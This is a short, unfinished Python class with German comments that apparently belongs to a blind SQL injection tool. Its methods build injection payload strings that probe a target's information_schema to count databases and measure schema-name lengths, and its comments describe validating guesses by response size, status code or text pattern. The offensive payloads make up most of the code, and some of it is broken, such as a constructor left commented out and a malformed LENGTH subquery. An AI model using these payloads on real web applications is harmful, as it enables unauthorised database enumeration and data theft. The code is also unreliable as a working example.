class BlindSqlInjection:
    #def __init__(self,to_enjected_path,to_validate):
    #    self.to_enjected_path = to_enjected_path
    #    self.to_validate = to_validate
# DIESE Classe gibt nur die sql formel NICHTS anders!

# to validate OPTIONEN
# \-> contentsize -> das geht
# \-> status code -> das geht
# \-> text pattern -> re.macth

# finde die zur FUZZ stelle heraus?

# fnde die menge der Datenbanken heraus
    def get_databases_number(self):
        sql_query = 'SELECT COUNT(*) FROM information_schema.schemata'
        result = self.inject_counter(sql_query)
        return result

#param=FUZZ' and (SELECT COUNT(*) FROM information_schema.schemata)>1 -- -
# inject sqli command
    def inject_counter(self,sql_query):
        sql_payload = f'e\' and ({sql_query})>_counter_ -- -'
        return sql_payload


# finde die länge des wortes heraus.
# loop alle Buchtstaben und charactereeinemal durch
    def get_length_name(self):
        sql_query = 'LENGTH(SELECT schema_name FROM information_schema.schemata LIMIT 1)'
        result = self.inject_counter(sql_query)
        return result
